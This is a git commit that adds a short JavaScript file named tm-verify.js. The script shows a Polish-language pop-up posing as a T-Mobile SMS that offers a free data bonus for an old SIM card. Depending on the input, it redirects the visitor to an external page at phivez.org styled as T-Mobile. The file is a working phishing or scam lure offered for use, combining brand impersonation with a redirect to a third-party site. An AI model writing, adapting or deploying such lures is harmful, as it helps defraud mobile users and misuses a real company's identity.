b50e8304687fc72bd231aa16214a5580cec62006
newblog13 <sweet16guyz@gmail.com>
2026-06-21 08:01:30 +0100

    Create tm-verify.js

---
+++ tm-verify.js
@@ -0,0 +1,5 @@
+var password = 'AKTYWOWAĆ'
+password=prompt('SMS: Drogi Kliencie, PRZESTAŃ ignorować swoją starą kartę SIM T-Mobile. Możesz kwalifikować się do DARMOWEGO bonusu danych od 5 GB do 50 GB, w zależności od wieku karty SIM. Naciśnij OK, aby sprawdzić teraz. ','AKTYWOWAĆ');
+if (password != 'AKTYWOWAĆ') {
+location.href='https://phivez.org/t-mobile.html';
+}
